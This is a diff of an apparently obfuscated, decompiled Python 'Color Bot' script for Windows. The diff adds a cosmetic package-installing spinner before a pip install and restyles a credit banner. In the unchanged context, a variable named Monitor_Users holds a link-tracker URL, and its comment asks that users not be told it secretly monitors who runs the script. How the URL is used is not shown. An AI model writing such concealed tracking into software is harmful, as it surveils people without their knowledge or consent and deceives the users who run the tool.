@@ -1,6 +1,6 @@
 import os #line:1
 import time #line:2
-
+import sys
 """Colors For Ui"""#line:4
 BLACK ="\033[0;30m"#line:5
 RED ="\033[0;31m"#line:6
@@ -23,8 +23,15 @@ os.system("cls")
 print(f"{LIGHT_WHITE}Color Bot, {YELLOW}Coming Soon{LIGHT_WHITE}!")
 time.sleep(2.5)
 os .system ("cls")
-print (f"{LIGHT_WHITE}If Your Python Version Is Higher Then {YELLOW}'3.13.2'{LIGHT_WHITE}, {LIGHT_WHITE}Please Uninstall And Install {YELLOW}'3.13.2'\033[0m")#line:25
-time .sleep (3 )
+def packages ():#line:38
+ O0O00O0OOOO0OOOO0 =['/','-','\\','|']#line:39
+ for O0000OOOOOO0O00O0 in range (5 ):#line:40
+  for OOOOOO00O0OOOOO00 in O0O00O0OOOO0OOOO0 :#line:41
+     sys .stdout .write (f'\r{LIGHT_WHITE}Installing all the packages need for the script, please wait...  {LIGHT_PURPLE}{OOOOOO00O0OOOOO00}')#line:42
+     sys .stdout .flush ()#line:43
+     time .sleep (0.1 )#line:44
+packages ()#line:45
+time .sleep (0.01)
 os .system ("pip install pygame pywin32 colorama requests")
 import os #line:28
 import shutil #line:29
@@ -34,7 +41,6 @@ import win32con #line:32
 os .environ ['PYGAME_HIDE_SUPPORT_PROMPT']='1'#line:33
 import pygame #line:34
 from colorama import Fore ,Style #line:35
-import sys #line:36
 os .system ('cls')#line:37
 import requests
 Monitor_Users ="https://mymap.quest/A2AYNW" #Lonely Please Don't Tell Them, Im Only Using This To Monitor Whos Useing The Script
@@ -50,9 +56,9 @@ def loading ():#line:38
      time .sleep (0.1 )#line:44
 loading ()#line:45
 os .system ("cls")#line:46
-print (f"{LIGHT_GREEN}.............................................................................................................")#line:47
-print (f"{LIGHT_RED}:{LIGHT_WHITE} This Project Was A Reverse Engineering Script Edited And Decompiled By Controller Ascend, {LIGHT_GREEN}@BisKit {LIGHT_CYAN}@Lonely{LIGHT_WHITE}{LIGHT_RED} : \033[0m")#line:48
-print (f"{LIGHT_CYAN}.............................................................................................................")#line:49
+print (f"{LIGHT_GREEN}*************************************************************************************************************")#line:47
+print (f"{LIGHT_RED}:{LIGHT_WHITE}🐧 This Project Was A Reverse Engineering Script Edited And Decompiled By Controller Ascend, {LIGHT_GREEN}@BisKit {LIGHT_CYAN}@Lonely{LIGHT_WHITE}{LIGHT_RED}: \033[0m")#line:48
+print (f"{LIGHT_CYAN}**************************************************************************************************************")#line:49
 time .sleep (4 )#line:50
 os .system ('cls')#line:51
 def main2 ():#line:52
